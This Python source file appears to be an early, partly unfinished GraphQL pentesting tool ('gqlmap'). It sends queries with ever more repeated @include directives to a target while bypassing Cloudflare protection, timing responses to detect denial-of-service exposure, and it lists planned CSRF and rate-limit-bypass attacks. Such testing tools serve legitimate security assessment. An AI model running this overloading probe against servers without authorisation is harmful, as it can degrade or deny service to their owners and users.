#!/usr/bin/env python
__version__ = "1.0.0"

try:
    import sys
    sys.dont_write_bytecode = True

    import cloudscraper
    import json
    import time
    import argparse
    import threading
    import logging
    import traceback

    import lib.parse.cmdargs as cmdargs
    from lib.core.init import conf
    from lib.core.init import logger
    from lib.core.options import initOptions
    from lib.core.settings import BANNER
    from lib.core.common import print_banner
    from lib.core.common import stdoutWrite
    from lib.core.common import COLOURS

      

except KeyboardInterrupt:
    error = "user aborted during library importing"
    import time
    sys.exit("\r[%s] [CRITICAL] %s" % (time.strftime("%X"), error))

#TODO: 
# - automatically try GET & POST
# - add way to cancel scan while it's running
# - add more format options for queries - not all GraphQL will be JSON in the body
# - add date/time to output like sqlmap
# - add logo, legal disclaimer, version
# - add error to let user know if universal queries & introspection aren't enabled
# - test against graphql-armor
# - FEATURES
#   - proxy
#   - fingerprint GraphQL engine
#   - attempt through websocket if introspection/universal queries not enabled
#   - attempt CSRF attacks
#   - attempt cross-site websocket hijacking
#   - rate limit bypassing using Aliases 
#   - Alias Overloading
#   - Array-based Query Batching
#   - Field Duplication Vulnerability
#   - Incremental delivery abuse

class LoadingCursor:
    def __init__(self):
        self.loading = False
        self.thread = None
    
    def start(self):
        self.loading = True
        self.thread = threading.Thread(target=self._animate)
        self.thread.daemon = True
        self.thread.start()
    
    def _animate(self):
        while self.loading:
            for cursor in ['|          |', '|.         |', '|..        |', '|...       |', '| ...      |', '|  ...     |', '|   ...    |', '|    ...   |', '|     ...  |', '|      ... |', '|       ...|', '|        ..|', '|         .|', '|          |']:
                if not self.loading:
                    break
                sys.stdout.write(f'\r{cursor}')
                sys.stdout.flush()
                time.sleep(0.1)
    
    def stop(self):
        self.loading = False
        if self.thread:
            self.thread.join()
        sys.stdout.write('\r')
        sys.stdout.flush()
        #sys.stdout.write('\rDone!            \n')

def directive_overloading(url, headers=None):
    """
    Returns performance data which contains two lists: [response_time_milliseconds, overload_count]
    """
    query = "query overload {__typename @include(if:true) @include(if:true) @include(if:true)}"
    performance_data = [[], []] # [response_time_milliseconds, overload_count]
    #response_tracking = []
    
    #make sure it is a valid url and works
    results = make_post_request(
        url=url,
        json_data={"query": query},
        headers=headers
    )

    #TODO: add something to detect if cloudflare is blocking us
    # Cloudflare</title>
    # <h1 data-translate="block_headline">Sorry, you have been blocked</h1>
    # 
    print(f"Initial test of {url}")
    print(f"Status Code: {results['status_code']}, Response Time (ms): {results['response_time_milliseconds']}, Query: {query}")
    
    if results['status_code'] == 403:
        print(results['content'])
        exit()

    if results['json'] is None:
        print("Response is not JSON, something went wrong")
        print(results['content'])
        return
    #might need to get rid of this to handle other GraphQL engines
    if 'data' not in results['json']:
        print("No data field in response, something went wrong")
        print(results['content'])
        return
    
    #baseline_response_time = results['response_time_milliseconds']
    #x = 0
    overload_count = 3
    while True: #loop until we hit a stopping condition
        overload_count = overload_count * 2
        query = f"query overload {{__typename {'@include(if:true) ' * overload_count}}}"
        results = make_post_request(
            url=url,
            json_data={"query": query},
            headers=headers
        )
        if results['status_code'] == 403:
            print(results['content'])
            exit()
        #if not 'data' in results['json']:
        #    print("No data field in response, something went wrong")
        #    print(results['content'])
        #    return
        #check if we got a non-200 status code, cloudflare may timeout or block us
        if results['status_code'] != 200:
            print(f"Non-200 status code received, stopping test. Status Code: {results['status_code']} - Response Time (ms): {results['response_time_milliseconds']}")
            if "y" or "yes" in input("Do you want to see the full response? (y/n): ").lower():
                print(results['content'])
            return performance_data
        
        performance_data[1].append(overload_count)
        performance_data[0].append(results['response_time_milliseconds'])
        

        print(f"Overload Count: {overload_count} - Response Time (ms): {results['response_time_milliseconds']}")

        if results['response_time_milliseconds'] > 60000: #if the response time is over 60 seconds stop the test
            print("Response time exceeded 60 seconds, stopping test")
            break
        
        # TODO: add a way to check if the response time is constnantly increasing
        # need to make sure that the repsonse times are tied to the overload count
        # - if the overload count is increasing but the response time is not the application is not vulnerable
        #    - could be using timouts to kill processing of the query
        #    - could have a limit to directives
        #    - could be filtering directives with a WAF
        #x += 1
        time.sleep(1) #be nice to the server
    return performance_data
    




def make_post_request(url, data=None, json_data=None, headers=None):
    """
    Make a POST request to the specified URL
    
    Args:
        url (str): The URL to send the POST request to
        data (dict, optional): Form data to send (for form-encoded requests)
        json_data (dict, optional): JSON data to send
        headers (dict, optional): Request headers
    
    Returns:
        dict: Response information including status code and content
    """
    loader = LoadingCursor()
    try:
        loader.start()
        scraper = cloudscraper.create_scraper()
        response = scraper.post(
            url=url,
            data=data,
            json=json_data,
            headers=headers,
            timeout=120 # set a timeout to avoid prematurely stopping the test
        )
        elapsed_time = response.elapsed.total_seconds()
        loader.stop()
        # Return response information
        return {
            'success': True,
            'status_code': response.status_code,
            'content': response.text,
            'json': response.json() if response.headers.get('content-type') == 'application/json' else None,
            'headers': dict(response.headers),
            'response_time_seconds': elapsed_time,
            'response_time_milliseconds': elapsed_time * 1000
        }
    
    except Exception as e:
        loader.stop()
        return {
            'success': False,
            'error': str(e),
            'status_code': None,
            'response_time_seconds': None
        }
def main():
    """
    Main function of gqlmap.
    """
    try:
        args = cmdargs.get_cmd_arguments()
        initOptions(args)

        print_banner(BANNER)

        stdoutWrite(f"[*] Started at %s\n\n" % time.strftime("%X %Y/%m/%d"))
    except Exception as errMsg:
        excMsg = traceback.format_exc()
        logger.critical("%s\n%s" % (errMsg, excMsg))
        raise SystemExit
        

    logger.warning(msg="Test")
    logger.info(msg="Test")
    logger.debug(msg="Test")
    logger.error(msg="Test")
    logger.critical(msg="Test")
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    except SystemExit:
        raise
    except:
        traceback.print_exc()
    """
    header={"Content-Type": "application/json"}
    if args.cookies:
        header["Cookie"] = args.cookies
    
    #default to plotting data
    if args.plot_bool and args.plot_bool.lower() in ['false', 'f', '0', 'no', 'n']:
        args.plot_bool = False
    else:
        args.plot_bool = True

    data = directive_overloading(args.target_url, headers=header if args.cookies else None)
    if data and args.plot_bool==True:
        import plotext as plt
        plt.simple_bar(data[1], data[0], title="GraphQL Directive Overloading Performance", width=100)
        plt.show()
    """